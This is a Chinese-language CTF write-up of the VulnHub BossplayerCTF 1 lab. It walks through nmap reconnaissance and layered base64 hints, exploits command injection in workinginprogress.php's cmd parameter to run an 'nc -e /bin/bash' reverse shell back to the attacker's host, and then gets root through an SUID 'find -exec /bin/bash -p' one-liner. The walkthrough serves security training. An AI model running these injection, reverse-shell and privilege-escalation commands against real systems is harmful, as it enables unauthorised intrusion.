---
title: "Bossplayerctf 1 Vulnhub靶场复现-重走来时路5"
description: "复习一个简单的靶场，下一个复习的靶场难度还是挺大的"
slug: "vulnhub-bosscplayerctf1"
pubDate: "2026-08-10"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# BossplayerCTF VulnHub 靶场复现

## 靶场介绍与搭建

下载地址 https://www.vulnhub.com/entry/bossplayersctf-1,375/

介绍

Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTF's. It should take around 30 minutes to root.

This works better with VirtualBox rather than VMware

看来是很简单了

靶场搭建

作者既然推荐搭建在VirtualBox就搭建在VirtualBox，网卡选择hostonly模式，来到VMware的kali自然是桥接网卡设置为VIrtualBox的网卡

这里由于我下载的是学长改的ovf格式靶机（只修改网卡配置支持VMware nat模式），就搭建在VMware，靶机，攻击机均为nat

## 信息收集

### 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

10.10.10.136 是靶机的ip

### 端口扫描

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bossplayerctf]
└─$ sudo nmap --min-rate 1000 -p- 10.10.10.136
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 01:44 -0400
Nmap scan report for 10.10.10.136
Host is up (0.0016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:B6:37:20 (VMware)
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bossplayerctf]
└─$ sudo nmap -p22,80 -sS -A 10.10.10.136
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 01:45 -0400
Nmap scan report for 10.10.10.136
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 ac:0d:1e:71:40:ef:6e:65:91:95:8d:1c:13:13:8e:3e (RSA)
|   256 24:9e:27:18:df:a4:78:3b:0d:11:8a:92:72:bd:05:8d (ECDSA)
|_  256 26:32:8d:73:89:05:29:43:8e:a1:13:ba:4f:83:53:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:B6:37:20 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE
HOP RTT     ADDRESS
1   1.15 ms 10.10.10.136
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.65 seconds
```

### 漏洞脚本探测

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bossplayerctf]
└─$ sudo nmap --script=vuln -p22,80 10.10.10.136
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 01:47 -0400
Nmap scan report for 10.10.10.136
Host is up (0.0011s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|   /logs.php: Logs
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:B6:37:20 (VMware)
```

## 漏洞寻找和利用

由于爆出个robots.txt路径，加上难度不大，先不进行目录扫描，卡住了，再回来看看

## 80端口访问

网站内容，前端源代码藏有注释

```markdown
## bossplayers CTF - created by Cuong Nguyen

Difficulty Level: [* ] [ ] [ ] [ ] [ ]

Description: Hello! Extremely easy CTF that I created for those who want to get their feet wet. Have a methodology and avoid the rabit holes! I hope you enjoy this and most importantly, please have fun!

Website: sudocuong.com
```

非常简短，提示我们注意有坑

下面是前端源代码注释

```html
<!--WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK-->
```

辨认出这是base64，开始解码操作,还是多层嵌套

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bossplayerctf]
└─$ echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d
ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bossplayerctf]
└─$ echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d
d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bossplayerctf]
└─$ echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d
workinginprogress.php
```

暴露一个新路径

### robots.txt 访问

super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg== 简短一句话，也是base64

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bossplayerctf]
└─$ echo "bG9sIHRyeSBoYXJkZXIgYnJvCg==" | base64 -d
lol try harder bro
```

这就是坑吗

### 访问workinginprogress.php

```shell
### System Install:

Linux Debian - [*]

APACHE2 - [*]

PHP - [*]

### Outstanding:

Test ping command - [ ]

Fix Privilege Escalation - [ ]

### Completed:

Say Hi to Haley - [*]
```

## 验证命令注入漏洞

test ping command 也许是一个命令注入漏洞，?cmd get传参尝试

http://10.10.10.136/workinginprogress.php?cmd=ls

下方多一行 index.html logs.php robots.txt workinginprogress.php

继续验证

?cmd=whoami 回显 www-data

?cmd=pwd 回显 /var/www/html

目前可以确认是一个漏洞了，尝试有无写入webshell的可能

## 命令注入shell和反弹shell

在终端输入

```shell
nc -lvnp 8888
```

传参为 ?cmd=nc%20-e%20/bin/bash%2010.10.10.10%208888

理所应当反弹shell 了

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bossplayerctf]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.136] 58978
ls
index.html
logs.php
robots.txt
workinginprogress.php
```

python -c 'import pty;pty.spawn("/bin/bash")' 升级交互shell

## 权限提升

### sudo 提权尝试

根据super secret password 前面的提示，当然大概率是错的，验证了就是

```shell
www-data@bossplayers:/var/www/html$ sudo -l
sudo -l
bash: sudo: command not found
www-data@bossplayers:/var/www/html$
```

### suid提权尝试

```shell
www-data@bossplayers:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/grep
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/find
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
www-data@bossplayers:/var/www/html$
```

/usr/bin/find 设置了SUID位，这意味着可以用它来提权到root！

find . -exec /bin/bash -p \;

## 提权成功

```shell
www-data@bossplayers:/var/www/html$ find . -exec /bin/bash -p \;
find . -exec /bin/bash -p \;
bash-5.0#
```

## flag 又是base64

```shell
bash-5.0# cd /root
cd /root
bash-5.0# ls -liah
ls -liah
total 24K
 207 drwx------  2 root root 4.0K Sep 28  2019 .
   2 drwxr-xr-x 18 root root 4.0K Sep 28  2019 ..
  33 -rw-------  1 root root  929 Sep 28  2019 .bash_history
 274 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
 273 -rw-r--r--  1 root root  148 Aug 18  2015 .profile
1367 -rw-r--r--  1 root root   25 Sep 28  2019 root.txt
bash-5.0# cat root.txt
cat root.txt
Y29uZ3JhdHVsYXRpb25zCg==
bash-5.0# echo "Y29uZ3JhdHVsYXRpb25zCg==" | base64 -d
echo "Y29uZ3JhdHVsYXRpb25zCg==" | base64 -d
congratulations
bash-5.0#
```
